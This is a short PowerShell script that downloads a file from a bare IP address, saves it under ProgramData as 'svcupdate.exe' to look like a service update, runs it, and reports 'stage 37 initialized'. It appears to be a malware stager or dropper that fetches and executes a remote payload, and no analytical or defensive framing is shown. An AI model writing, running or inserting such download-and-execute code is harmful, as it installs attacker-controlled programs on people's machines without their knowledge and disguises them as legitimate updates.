
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://198.51.100.214/assets/update.dat',
    [string]$WorkingPath = 'C:\ProgramData\svcupdate.exe'
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $WorkingPath)
Start-Process -FilePath $WorkingPath
Write-Output "stage 37 initialized"
